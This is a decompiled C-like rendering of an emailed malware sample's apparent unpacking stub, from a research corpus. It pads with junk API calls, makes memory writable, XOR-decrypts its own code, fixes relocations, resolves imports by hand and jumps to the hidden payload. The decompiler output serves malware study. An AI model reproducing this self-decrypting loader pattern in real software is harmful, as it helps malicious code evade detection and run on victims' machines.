// subject.c
// Generated on 5/4/2015 12:43:48 AM by decompiling malware_via_email/malware_0114/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 edi)
{
fn00401000_entry:
l00401000:
	word32 ebx_1061 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + 0x00000024 + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 ebp_1098 = 0x00000000
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l004012F6
l004012F3:
	ebx_1061 = ebx_1061 - 0x00000022
l004012F6:
	Mem1071[fp - 0x00000024:word32] = 0x00000059
	CloseHandle(0xFFFFFFFF)
	Mem1076[fp - 0x00000024:word32] = fp - 0x00000010
	Mem1078[fp - 0x00000028:word32] = 0x00000040
	Mem1080[fp - 0x0000002C:word32] = 0x00003000
	Mem1082[fp - 0x00000030:word32] = 0x00401000
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 eax_1086 = 0x00000000
l00401320:
	branch ebp_1098 != ebx_1061 l00401326
l00401324:
	ebp_1098 = 0x00000000
l00401326:
	byte v14_1103 = Mem1082[eax_1086 + 0x004014A0:byte] ^ Mem1082[ebp_1098 + 0x00404000:byte]
	Mem1104[eax_1086 + 0x004014A0:byte] = v14_1103
	eax_1086 = eax_1086 + 0x00000001
	ebp_1098 = ebp_1098 + 0x00000001
	branch eax_1086 <u 0x00001420 l00401320
l00401342:
	word32 esi_1114 = 0x00000000
	word32 edx_1117 = 0x00402780
	word32 dwLoc04_1120 = 0x00000000
l00401362:
	word32 eax_1130 = Mem1104[edx_1117 + 0x00000004:word32]
	word32 ecx_1135 = edx_1117 + 0x00000008
	branch eax_1130 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004013A4
l00401371:
	word32 dwLoc08_1297 = eax_1130 - 0x00000008 >>u 0x00000001
l00401375:
	branch (Mem1104[ecx_1135 + 0x00000000:word16] & 0xF000) != 0x3000 l00401396
l00401385:
	word32 eax_1321 = ((word32) Mem1104[ecx_1135 + 0x00000000:word16] & 0x00000FFF) + Mem1104[edx_1117 + 0x00000000:word32]
	Mem1324[eax_1321 + 0x00401220:word32] = Mem1104[eax_1321 + 0x00401220:word32] + 0xF0401220
l00401396:
	word32 v18_1313 = dwLoc08_1297 - 0x00000001
	ecx_1135 = ecx_1135 + 0x00000002
	dwLoc08_1297 = v18_1313
	branch v18_1313 != 0x00000000 l00401375
l004013A0:
	esi_1114 = dwLoc04_1120
l004013A4:
	esi_1114 = esi_1114 + Mem1104[edx_1117 + 0x00000004:word32]
	dwLoc04_1120 = esi_1114
	edx_1117 = edx_1117 + Mem1104[edx_1117 + 0x00000004:word32]
	branch esi_1114 <u 0x000000E4 l00401362
l004013B9:
	word32 esi_1151 = 0x00401F7C
	word32 dwLoc04_1152 = 0x00401F7C
	esi_1180 = esi_1151
	branch Mem1104[0x00401F8C:word32] == 0x00000000 l00401459
l004013D0:
	word32 esi_1180
	word32 eax_1188 = LoadLibraryA(Mem1104[esi_1180 + 0x0000000C:word32] + 0x00401220)
	word32 edx_1190 = eax_1188
	branch eax_1188 == 0x00000000 l00401448
l004013E6:
	word32 ebp_1214 = Mem1104[esi_1180 + 0x00000000:word32]
	branch ebp_1214 != 0x00000000 l004013EF
l004013EC:
	ebp_1214 = Mem1104[esi_1180 + 0x00000010:word32]
l004013EF:
	word32 eax_1219 = Mem1104[ebp_1214 + 0x00401220:word32]
	word32 ebp_1221 = ebp_1214 + 0x00401220
	word32 ebx_1223 = Mem1104[esi_1180 + 0x00000010:word32] + 0x00401220
	branch eax_1219 == 0x00000000 l00401444
l00401400:
	goto l00401406
l00401402:
	edx_1190 = eax_1188
l00401406:
	word32 eax_1262
	branch eax_1219 >= 0x00000000 l0040141B
l0040140A:
	eax_1262 = GetProcAddress(edx_1190, (word32) Mem1104[ebp_1221 + 0x00000000:word16])
	goto l0040142E
l0040141B:
	eax_1262 = GetProcAddress(edx_1190, eax_1219 + 0x00401222)
l0040142E:
	Mem1266[ebx_1223 + 0x00000000:word32] = eax_1262
	ebp_1221 = ebp_1221 + 0x00000004
	eax_1219 = Mem1266[ebp_1221 + 0x00000000:word32]
	ebx_1223 = ebx_1223 + 0x00000004
	branch eax_1219 != 0x00000000 l00401402
l00401440:
	esi_1180 = dwLoc04_1152
l00401444:
l00401448:
	esi_1180 = esi_1180 + 0x00000014
	dwLoc04_1152 = esi_1180
	branch Mem1104[esi_1180 + 0x00000010:word32] != 0x00000000 l004013D0
l00401459:
	call 0x00401C70 (retsize: 4; depth: 36)
	ExitProcess(0x00000000)
fn00401000_exit:
}

